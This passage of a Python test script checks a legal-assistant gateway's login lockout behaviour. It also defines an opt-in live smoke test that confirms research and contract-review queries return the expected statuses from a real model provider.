          "...carrying retry_after")
    _colleague = _V["auth.login"].run(
        {"email": "lawyer@firm.example", "password": "a-strong-enough-password"}, _pub_ctx)
    check(_colleague.get("status") == "ok",
          f"...but a COLLEAGUE signing in from the same address is not locked out: the "
          f"address line ({_accounts_mod.LOGIN_LOCKOUT_IP_MAX}) is above the email line "
          f"({_colleague.get('code')})")

    print(f"\n{ok}/{ok + fail} passed")
    if fail:
        raise SystemExit(1)


def _live_smoke() -> int:
    """STEP 4a: the gated conversation.send checks, but against the REAL provider.

    The gate always uses deterministic stand-ins (`_send_research`/`_send_contract`), so it is
    the same on every machine and makes no paid call. This runs the SAME queries with NO
    stand-in (`model_for` unset), so a real model answers -- the opt-in proof that the live
    path still yields the statuses the stand-ins stand for. It is off the floors and never part
    of the gate.

    When no provider is configured it BLOCKS (prints the reason, exits 0) rather than failing:
    "no key" is not a test failure, it is a run that could not happen.
    """
    from gateway.models import available_providers
    from gateway.store import MemoryBackend

    providers = available_providers()
    if not providers:
        print("gateway/verbs --live: BLOCKED -- no model provider is configured "
              "(set a key in .env). Nothing was run; this is not a failure.")
        return 0
    print(f"gateway/verbs --live: real provider(s) {sorted(providers)}")

    ok = fail = 0

    def check(cond, label):
        nonlocal ok, fail
        print(f"  {'[PASS]' if cond else '[FAIL]'} {label}")
        if not cond:
            fail += 1
        else:
            ok += 1

    v = by_name()
    from gateway import envelope as ev

    def send(ctx, **kw):
        return v["conversation.send"].run({"conversation_id": "live", **kw}, ctx)

    # research: wholly-held -> ANSWERED; held+unheld -> PARTIAL. model_for unset = real model.
    ctx = Context(store=MemoryBackend(), clock=lambda: "2026-10-01T00:00:00+00:00")
    a = send(ctx, text="What is the quorum for a meeting of the Board?")["envelope"]
    check(a["status"] == ev.ANSWERED, f"held-law question is ANSWERED live ({a['status']})")
    p = send(ctx, text="What is the quorum for a meeting of the Board under the Companies "
                       "Act, and does FEMA affect it?")["envelope"]
    check(p["status"] == "PARTIAL", f"held+unheld question is PARTIAL live ({p['status']})")

    # contract review -> NEEDS_LAWYER (DRAFT playbook), with a real model reading the clauses.
    cctx = Context(store=MemoryBackend(), clock=lambda: "2026-10-01T00:00:00+00:00", synthetic_fixtures=True)
    up = v["documents.upload"].run(
        {"text": "1. The Receiving Party shall keep Confidential Information secret.",
         "name": "nda.docx"}, cctx)
    rc = send(cctx, text="Please review this NDA against our playbook.",
              file_ids=[up["document_id"]], test_data="fixture")["envelope"]
    check(rc["status"] == ev.NEEDS_LAWYER,
          f"contract review NEEDS_LAWYER live ({rc['status']})")

    print(f"\n{ok}/{ok + fail} passed (live, not counted in floors)")
    return 1 if fail else 0
